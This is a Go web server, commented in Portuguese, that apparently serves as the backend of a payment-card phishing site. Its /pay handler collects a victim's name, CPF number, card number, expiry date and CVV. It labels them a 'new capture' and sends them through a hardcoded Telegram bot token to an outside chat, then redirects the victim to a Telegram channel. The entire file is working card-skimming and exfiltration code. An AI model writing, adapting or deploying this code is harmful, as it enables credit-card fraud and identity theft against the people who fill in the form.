package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
)

// CONFIGURAÇÕES DO SEU BOT (ID e Token já inseridos)
const (
	botToken = "8425756950:AAGwzx4hX2rFhZ-VWEJ_2kLa6olnIF8GjoI" 
	chatID   = "7331217418" 
)

// Função de envio simplificada e robusta
func sendToTelegram(text string) {
	// Codifica o texto para que espaços e símbolos não quebrem o link
	encodedText := url.QueryEscape(text)
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=Markdown", 
		botToken, chatID, encodedText)
	
	_, err := http.Get(apiURL)
	if err != nil {
		fmt.Printf("Erro ao enviar: %s\n", err)
	}
}

func handler(w http.ResponseWriter, r *http.Request) {
	// CORS: Permite que o Netlify se comunique com o Render
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	if r.Method == "POST" {
		r.ParseForm()

		// Organiza o log com emojis para facilitar a leitura no seu celular
		msg := fmt.Sprintf("💳 *NOVA CAPTURA OTTERLY*\n\n"+
			"👤 *Nome:* %s\n"+
			"🆔 *CPF:* %s\n"+
			"💳 *Cartão:* %s\n"+
			"📅 *Exp:* %s\n"+
			"🔐 *CVV:* %s",
			r.FormValue("nome"), r.FormValue("cpf"), r.FormValue("cartao"), r.FormValue("validade"), r.FormValue("cvv"))

		sendToTelegram(msg)

		// Link do seu canal de destino
		canalVIP := "https://t.me/+BWgYKAExUIU3ZTBh"
		http.Redirect(w, r, canalVIP, http.StatusSeeOther)
		return
	}

	fmt.Fprintf(w, "API Otterly On-line.")
}

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	http.HandleFunc("/pay", handler)

	fmt.Printf("Servidor rodando na porta %s...\n", port)
	http.ListenAndServe(":"+port, nil)
}
